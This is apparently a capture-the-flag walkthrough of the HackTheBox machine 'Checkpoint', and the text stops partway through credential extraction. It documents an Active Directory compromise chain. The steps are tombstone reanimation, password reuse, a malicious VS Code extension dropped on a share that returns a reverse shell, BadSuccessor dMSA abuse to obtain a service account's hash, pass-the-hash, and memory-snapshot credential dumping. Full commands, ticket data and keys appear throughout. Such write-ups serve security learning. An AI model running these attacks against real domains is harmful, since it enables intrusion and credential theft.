---
title: Checkpoint
layout: post
released: 2026-09-18
creators: anuragtaparia
pwned: true
tags:
  - diff/medium
  - os/windows
category:
  - HTB
description: Checkpoint is an assumed breach scenario AD Windows machine. Alex, the assumed breach user, is able to resurrect mark who has access to a VSCode extension share. Uploading a custom extension we get a shell as Ryan who can exploit BadSuccessor to gain access as svc\_deploy who can read the VMBackups share which contains VMs that allow us to extract the rc4 hash of the administrator to get root.
image: /assets/img/img_checkpoint/0001.jpeg
cssclasses:
  - custom_htb
---
![](/assets/img/img_checkpoint/0001.jpeg)
# Enumeration

> As is common in real life pentests, you will start the Checkpoint box with credentials for the following account alex.turner / Checkpoint2024!
{:.info}

## Scans

As usual we start off with an `nmap` port scan

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-15 13:17:26Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58161/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-06-15T13:18:20
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53057/tcp): CLEAN (Timeout)
|   Check 2 (port 55192/tcp): CLEAN (Timeout)
|   Check 3 (port 37352/udp): CLEAN (Timeout)
|   Check 4 (port 32048/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```
{:.filename="nmap.txt"}

<table id="bkmrk-port%28s%29-service-vers" style="text-align: left"><thead><tr><th>Port(s)</th><th>Service</th><th>Version / Notes</th></tr></thead><tbody><tr><td>53</td><td>DNS</td><td>Simple DNS Plus</td></tr><tr><td>88</td><td>Kerberos</td><td>MS Windows Kerberos — server time `2026-06-15 13:17:26Z`</td></tr><tr><td>135, 49664, 49670, 49671, 49675, 49693, 49706, 58161</td><td>MSRPC</td><td>Microsoft Windows RPC</td></tr><tr><td>139</td><td>NetBIOS</td><td>Microsoft Windows netbios-ssn</td></tr><tr><td>389, 3268</td><td>LDAP</td><td>AD LDAP — domain `checkpoint.htb` — 3268 = Global Catalog</td></tr><tr><td>445</td><td>SMB</td><td>SMB2 signing **enforced**</td></tr><tr><td>464</td><td>kpasswd</td><td>Kerberos password change</td></tr><tr><td>593, 49676</td><td>RPC over HTTP</td><td>Microsoft Windows RPC/HTTP 1.0</td></tr><tr><td>636, 3269</td><td>LDAPS / GC SSL</td><td>`tcpwrapped` — **no TLS cert, connections reset**</td></tr><tr><td>5985</td><td>WinRM</td><td>Microsoft HTTPAPI 2.0 — potential remote shell if creds/ticket work</td></tr><tr><td>9389</td><td>ADWS</td><td>.NET Message Framing — AD Web Services</td></tr></tbody></table>

# User

## Mark.Davies via Deleted Object Restore

Taking a look at our access as `alex.turner` we find that we can `Reanimate Tombstone` for `Mark Davies` and the `Employees OU`.

```bash
checkpoint.htb/alex.turner@ldap/dc01.checkpoint.htb@CHECKPOINT.HTB ~/htb/labs/checkpoint $ bloodyAD -v TRACE -H DC01.CHECKPOINT.HTB -d CHECKPOINT.HTB -k get writable
[*] Connection URL: ldap+kerberos-ccache://CHECKPOINT.HTB\None:alex.turner.ccache@DC01.CHECKPOINT.HTB/?serverip=10.129.1.28&dc=10.129.1.28
[*] Trying to connect to DC01.CHECKPOINT.HTB...
[*] Connection successful

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```
{:.filename="Reanimate Tombstones.acl"}

I'll use `bloodyAD restore` to recover the user account from the tombstones.

```bash
checkpoint.htb/alex.turner@ldap/dc01.checkpoint.htb@CHECKPOINT.HTB ~/htb/labs/checkpoint $ bloodyAD -v TRACE -H DC01.CHECKPOINT.HTB -d CHECKPOINT.HTB -k set restore "mark.davies"
[*] Connection URL: ldap+kerberos-ccache://CHECKPOINT.HTB\None:alex.turner.ccache@DC01.CHECKPOINT.HTB/?serverip=10.129.1.28&dc=10.129.1.28
[*] Trying to connect to DC01.CHECKPOINT.HTB...
[*] Connection successful
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```
{:.filename="Reanimate Tombstones"}

Seeing as the assumed breach credentials seemed a bit like a default password, I tried password reuse and it worked!

```bash
~/htb/labs/checkpoint $ getTGT.py 'CHECKPOINT.HTB/mark.davies:Checkpoint2024!' 
Impacket v0.14.0.dev0+20260406.132546.b12b2f3b - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in mark.davies.ccache
```
{:.filename="Mark.Davies Store Credentials"}

## Ryan.Brooks via Malicious VSIX

Taking a look around `Mark.Davies` has access to the `DevDrop` share which has a very interesting Description.
```bash
checkpoint.htb/mark.davies@CHECKPOINT.HTB ~/htb/labs/checkpoint $ nxc smb DC01.CHECKPOINT.HTB -k --use-kcache --shares
SMB         DC01.CHECKPOINT.HTB 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         DC01.CHECKPOINT.HTB 445    DC01             [+] CHECKPOINT.HTB\mark.davies from ccache 
SMB         DC01.CHECKPOINT.HTB 445    DC01             [*] Enumerated shares
SMB         DC01.CHECKPOINT.HTB 445    DC01             Share           Permissions            Remark
SMB         DC01.CHECKPOINT.HTB 445    DC01             -----           -----------            ------
SMB         DC01.CHECKPOINT.HTB 445    DC01             ADMIN$                                 Remote Admin
SMB         DC01.CHECKPOINT.HTB 445    DC01             C$                                     Default share
SMB         DC01.CHECKPOINT.HTB 445    DC01             DevDrop         READ,WRITE             VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         DC01.CHECKPOINT.HTB 445    DC01             IPC$            READ                   Remote IPC
SMB         DC01.CHECKPOINT.HTB 445    DC01             NETLOGON        READ                   Logon server share 
SMB         DC01.CHECKPOINT.HTB 445    DC01             SYSVOL          READ                   Logon server share 
SMB         DC01.CHECKPOINT.HTB 445    DC01             VMBackups 
```
{:.filename="DevDrop SMB Share"}

I'll be using this repository: [VsCodeExtLure](https://github.com/securezeron/VsCodeExtLure) to generate a malicious `VSCodeExtension` for me, after which I'll put the resulting file into the DevDrop share.
```bash
checkpoint.htb/mark.davies@CHECKPOINT.HTB ~/htb/labs/checkpoint $ smbclient.py 'CHECKPOINT.HTB/mark.davies@DC01.CHECKPOINT.HTB' -k -no-pass  
Impacket v0.14.0.dev0+20260406.132546.b12b2f3b - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
DevDrop
IPC$
NETLOGON
SYSVOL
VMBackups
# use DevDrop
# put VsCodeExtLure/Zeron-CySec/Zeron-CySec-0.0.1.vsix
# ls
drw-rw-rw-          0  Mon Jun 15 12:08:11 2026 .
drw-rw-rw-          0  Sat May  9 10:42:27 2026 ..
-rw-rw-rw-       3447  Mon Jun 15 12:07:52 2026 Zeron-CySec-0.0.1.vsix
```
{:.filename="Malicious VSCode Extension"}

I immediately get a callback on my `revShell` listener.
```powershell
~/htb/labs/checkpoint/VsCodeExtLure/Zeron-CySec $ nc -lvnp 9098
listening on [any] 9098 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.1.29] 52593
whoami
checkpoint\ryan.brooks
<SNIP>
PS C:\Users\ryan.brooks\Desktop> ls


    Directory: C:\Users\ryan.brooks\Desktop


Mode                 LastWriteTime         Length Name                                                                                                                                                                                                                       
----                 -------------         ------ ----                                                                                                                                                                                                                       
-ar---         6/15/2026   8:37 AM             34 user.txt
```
{:.filename="Malicious VSCode Extension RCE"}

There we can find the `user` flag.

# Root

## svc\_deploy via BadSuccessor

Let's take a look at the `ryan.brooks` user.
```bash
checkpoint.htb/alex.turner@ldap/dc01.checkpoint.htb@CHECKPOINT.HTB ~/htb/labs/checkpoint $ bloodyAD -v TRACE -H DC01.CHECKPOINT.HTB -d CHECKPOINT.HTB -k get object "ryan.brooks"
[*] Connection URL: ldap+kerberos-ccache://CHECKPOINT.HTB\None:alex.turner.ccache@DC01.CHECKPOINT.HTB/?serverip=10.129.1.29&dc=10.129.1.29
[*] Trying to connect to DC01.CHECKPOINT.HTB...
[*] Connection successful

distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 2026-05-13 14:14:37.287556+00:00
badPwdCount: 0
cn: Ryan Brooks
codePage: 0
countryCode: 0
dSCorePropagationData: 2026-05-10 13:15:06+00:00
givenName: Ryan
instanceType: 4
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 2026-06-15 15:38:11.339788+00:00
lastLogonTimestamp: 2026-06-09 17:30:52.872436+00:00
logonCount: 614
memberOf: CN=DevTeam,OU=Engineering,OU=Employees,DC=checkpoint,DC=htb; CN=VPN-Users,OU=Employees,DC=checkpoint,DC=htb
nTSecurityDescriptor: O:S-1-5-21-3129162710-3498938529-1807524340-512G:S-1-5-21-3129162710-3498938529-1807524340-512D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3129162710-3498938529-1807524340-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: Ryan Brooks
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
objectClass: top; person; organizationalPerson; user
objectGUID: 5b577ab6-a0fe-4332-885c-1ad5bdffbd8f
objectSid: S-1-5-21-3129162710-3498938529-1807524340-1103
primaryGroupID: 513
pwdLastSet: 2026-05-10 13:46:18.765924+00:00
sAMAccountName: ryan.brooks
sAMAccountType: 805306368
sn: Brooks
uSNChanged: 143411
uSNCreated: 12777
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: ryan.brooks@checkpoint.htb
whenChanged: 2026-06-09 17:30:52+00:00
whenCreated: 2026-05-09 09:01:06+00:00
```
{:.filename="Ryan Brooks"}

He has an `ObjectSid` of `S-1-5-21-3129162710-3498938529-1807524340-1103` which when searched through `ACLs` we find has `GenericWrite` on `svc_deploy`

```
distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
<SNIP>
nTSecurityDescriptor.ACL.9.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.9.Trustee: S-1-5-21-3129162710-3498938529-1807524340-1103
nTSecurityDescriptor.ACL.9.Right: GENERIC_WRITE
nTSecurityDescriptor.ACL.9.ObjectType: Self
```
{:.filename="That's suspicious..."}

As well as `CREATE_CHILD` on `DMSAHolder`
```bash
distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: S-1-5-21-3129162710-3498938529-1807524340-1103
nTSecurityDescriptor.ACL.3.Right: CREATE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Self
```
{:.filename="That's Weird..."}

Let's exploit this with a `BadSuccessor` attack which will create a malicious `DMSA` account listing the targeted `service` account as the `predecessor` which is checked by the `DC` upon authenticaiton against the `service`.
```bash
checkpoint.htb/ryan.brooks@CHECKPOINT.HTB ~/htb/labs/checkpoint $ bloodyAD -H DC01.CHECKPOINT.HTB -d CHECKPOINT.HTB -k -u 'ryan.brooks' add badSuccessor w1ld -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
[+] Creating DMSA w1ld$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : w1ld$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-15 16:29:55+00:00
EndTime      : 2026-06-16 02:13:03+00:00
RenewTill    : 2026-06-22 16:13:03+00:00
Flags        : enc-pa-rep, forwardable, forwarded, pre-authent, renewable
Keytype      : 18
Key          : aC/brhNP6Z1O7KsvkM/ZhSFmbWruBFXu3/C4KLwWIjY=
EncodedKirbi : 

    doIFsTCCBa2gAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3Ji
    dGd0Gw5DSEVDS1BPSU5ULkhUQqOCBFYwggRSoAMCARKhAwIBAqKCBEQEggRA8W/OD5zW6N4XoNcYckZn+KS9zN9VP4S/X6O7uGSD
    BNva1N/Q2urN+Mt3saA2LMcYu+lMbg8xrXVkmHpCY+NkVeYRhYjsjFnY2V+U4wP/Y+SzwW0eQyHOELCxuhYhVwiA/0zo1BDPaT4q
    HmvcdiG+Q9Rzoi/kItNMWLD4TCdj5nW1gVgWUrzcKRpUbS821T3VJIsALDzhmHjxjjgUcJapZpQLqw27GlR9ZzH+0zPyE2ojWikJ
    Qv3NYlT5zv2SGE9MdTkHNxZyPL28d+siBz4ZZicc1sgL2YWkDuGOTn50370akuFv4HYAGgT21ig3TW25TlZvWBL7seQRTlJVABTi
    S++ob6FVaPeKgtUbXYyZAewqkFc+sRBP5037BpsnebLiG3OIk9HdS1VIAXciqYkVYiRI2eGH0BnvPYOpU065P84dhDcHLs3ebr7+
    XjCrbLlRd0WD6bzIs5mW91J5nQgOUEOrLiipnzcRk7JsMCUPxCX6YkbRdN4j35cDdWqSe6riDXNjgajjoO1VhlKgghPFjX3t6fvD
    Iz3+hkeNK+0bgI8ZCBisyE6N7AzjpBVpl+cr+DBxxGjI134DfVkbT/zvdJdd1lglaXTzZ62Cx5CMNH8gGK8dVh0vRmhU/0sZbxfj
    aE9Knqg9z6omHz3skRp9cPhJ7NAxvXXaND2QAX/Q5g6ktI/v10kUsb97bN9oj0/4U+BeJLyg++2ppGfvFZ5yR/2BZ8TaG/yU/J2G
    mYdJH/Ukj3p74Qr5uvVPLFJ3nUcBxBU3dLC0i/b5Z80vE03uWxZ4f+GQs4LLQOl5v/WJHMx4359vkUYinrzPubnf2+D46Adm3Z5q
    WojNdA5ThOJBzfFczzwxFuPPAs/posV9T1ft4qkS02KtMsmjxrmDzb2dUDQvPh3JQ2LEU16SuZXjEZ8lalvjrVkw0sZQQ9O7+fuf
    bssyphI0axsjVoUe3rOAFI6sZzjptdOgnuKu6NeM3ZXBvdb2rGF4gfQz22k3qJCvQfVwWZF3ieZfXAfHK9zZJ/XhZeg81MBUFJKo
    QWA/sOQS9g0p9hl+gD7d9s2Qkm1Oelo27al+QetB+YngT5wUtDJFlwOau0udx5KIYxSYCKKNiiNzNOBBAdhb+gQi/6Bw8wZU9rnN
    GuyyTTcDnuYogSkogugRrgGCmCpyn+V7ou2A9uUHQb/VV8JLJDFUryAuVHGcMgqhUG1IAN7rzw8IzsNHbvrD7j0AZuVkhRxSOPHN
    fqf5C82NtgXsBLsvZ7/GASW7UFZjPjd19if8zROy9Az5YmcZzBv/2fw4iJXRhiz2BjZXh1UKDhTAKr5HVDiXhNsoFKsu6n5IsKSb
    DUQAGavbdXFK8zaoKPK1XGTXMukpX5MjDHgGJZTRHbTNoZ1LRlPYLf9GBIpLBJ7cS9+L9IEuSJ7Dp8vqbxNzfw+vUJ6UUCvaE7Am
    xTbHDBIz2BqjgfowgfegAwIBAKKB7wSB7H2B6TCB5qCB4zCB4DCB3aArMCmgAwIBEqEiBCBoL9uuE0/pnU7sqy+Qz9mFIWZtau4E
    Ve7f8LgovBYiNqEQGw5jaGVja3BvaW50Lmh0YqISMBCgAwIBAaEJMAcbBXcxbGQkowUDAwBgoaQRGA8yMDI2MDYxNTE2MTMwM1ql
    ERgPMjAyNjA2MTUxNjI5NTVaphEYDzIwMjYwNjE2MDIxMzAzWqcRGA8yMDI2MDYyMjE2MTMwM1qoEBsOQ0hFQ0tQT0lOVC5IVEKp
    IzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDkNIRUNLUE9JTlQuSFRC
[+] dMSA TGT stored in ccache file w1ld_cJ.ccache

dMSA current keys found in TGS:
AES256: 4b2700c8d64a559c256ace6ff23d90054df26068c881f6c3e0eb55b375ef6d4b
AES128: 0ff1ff497bdd4e8dc3d72422aaff9fd1
RC4: e6bbfced013b7b06326f9e4b372c6e4c

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16[REDACTED]
```
{:.filename="The Successor is a Baddie"}

The `previous keys found` shows us the `RC4` hash of the `predecessor` service account which is `svc_deploy`. Let's `PTH`

```bash
~/htb/labs/checkpoint $ nxc ldap CHECKPOINT.HTB -u 'svc_deploy' -H [REDACTED] -M whoami
LDAP        10.129.1.29     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.1.29     389    DC01             [+] checkpoint.htb\svc_deploy:[REDACTED] 
WHOAMI      10.129.1.29     389    DC01             Name: svc_deploy
WHOAMI      10.129.1.29     389    DC01             Description: Deployment service account
WHOAMI      10.129.1.29     389    DC01             sAMAccountName: svc_deploy
WHOAMI      10.129.1.29     389    DC01             Enabled: Yes
WHOAMI      10.129.1.29     389    DC01             Password Never Expires: Yes
WHOAMI      10.129.1.29     389    DC01             User Principal Name: svc_deploy@checkpoint.htb
WHOAMI      10.129.1.29     389    DC01             Last logon: Never
WHOAMI      10.129.1.29     389    DC01             Password Last Set: 2026-05-09 09:01:19 UTC
WHOAMI      10.129.1.29     389    DC01             Bad Password Count: 0
WHOAMI      10.129.1.29     389    DC01             Distinguished Name: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
WHOAMI      10.129.1.29     389    DC01             Member of: CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb
WHOAMI      10.129.1.29     389    DC01             Member of: CN=Remote Management Users,CN=Builtin,DC=checkpoint,DC=htb
WHOAMI      10.129.1.29     389    DC01             User SID: S-1-5-21-3129162710-3498938529-1807524340-1104
```
{:.filename="Landed on svc_deploy"}

## Administrator via VMKatz
We're a member of `Remote Management Users` as well as the `BackupAccess` groups. The `BackupAccess` group can read the `VMBackups` share.
```bash
~/htb/labs/checkpoint $ nxc smb checkpoint.htb -u 'svc_deploy' -H $REDACTED --shares
SMB         10.129.1.29     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.1.29     445    DC01             [+] checkpoint.htb\svc_deploy:$REDACTED 
SMB         10.129.1.29     445    DC01             [*] Enumerated shares
SMB         10.129.1.29     445    DC01             Share           Permissions            Remark
SMB         10.129.1.29     445    DC01             -----           -----------            ------
SMB         10.129.1.29     445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.1.29     445    DC01             C$                                     Default share
SMB         10.129.1.29     445    DC01             DevDrop                                VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.1.29     445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.1.29     445    DC01             NETLOGON        READ                   Logon server share 
SMB         10.129.1.29     445    DC01             SYSVOL          READ                   Logon server share 
SMB         10.129.1.29     445    DC01             VMBackups       READ
```
{:.filename="Read le Backups"}

Taking a look we can find a `NightlyBackup` present on the share.
```bash
~/htb/labs/checkpoint $ smbclient.py 'CHECKPOINT.HTB/svc_deploy@DC01.CHECKPOINT.HTB' -hashes :$REDACTED
Impacket v0.14.0.dev0+20260406.132546.b12b2f3b - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use VMBackups
# ls
drw-rw-rw-          0  Wed May 13 09:58:05 2026 .
drw-rw-rw-          0  Sat May  9 10:42:27 2026 ..
drw-rw-rw-          0  Wed May 13 09:58:18 2026 NightlyBackup_2024-11-01
```
{:.filename="Nighty Night"}

There's a `memory forensics` folder with a bunch of `VM` files inside of it.
```bash
# cd NightlyBackup_2024-11-01
# ls
drw-rw-rw-          0  Wed May 13 09:58:18 2026 .
drw-rw-rw-          0  Wed May 13 09:58:05 2026 ..
drw-rw-rw-          0  Wed May 13 09:58:18 2026 memory forensics
# cd memory forensics
# ls
drw-rw-rw-          0  Wed May 13 09:58:18 2026 .
drw-rw-rw-          0  Wed May 13 09:58:18 2026 ..
-rw-rw-rw-  106496000  Wed May 13 09:58:18 2026 Windows Server 2019-000001.vmdk
-rw-rw-rw- 2147483648  Wed May 13 09:58:18 2026 Windows Server 2019-Snapshot1.vmem
-rw-rw-rw-  138164859  Thu May 14 18:32:32 2026 Windows Server 2019-Snapshot1.vmsn
-rw-rw-rw-     270840  Wed May 13 09:58:18 2026 Windows Server 2019.nvram
-rw-rw-rw-       7642  Wed May 13 09:58:18 2026 Windows Server 2019.scoreboard
-rw-rw-rw- 10199695360  Wed May 13 09:58:18 2026 Windows Server 2019.vmdk
-rw-rw-rw-        502  Wed May 13 09:58:18 2026 Windows Server 2019.vmsd
-rw-rw-rw-       2749  Wed May 13 09:58:18 2026 Windows Server 2019.vmx
-rw-rw-rw-        274  Wed May 13 09:58:18 2026 Windows Server 2019.vmxf
```
{:.filename="That's Dangerous Sir!"}

We can also find the share in the `C:\Shares` directory, I'll run [vmkatz](#bkmrk-e16081eb077aca74bdbf) against the `vmsn` snapshot.
```bash
PS C:\w1ld> ./vmkatz.exe 'C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmsn'
[*] vmkatz v1.4.1
[*] System discovery: 7.9637669s
[*] Process enumeration: 811.6µs
[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
[*] Credential extraction: 47.5295ms

[+] 2 logon session(s), 2 with credentials:

  LUID: 0x3e4 (NETWORK SERVICE)
  Username: WIN-0DG6SJAEUTA$
  Domain: WORKGROUP
  [DPAPI]
    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
    MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3c6508d9e585527de78dc989e
    SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
  [DPAPI]
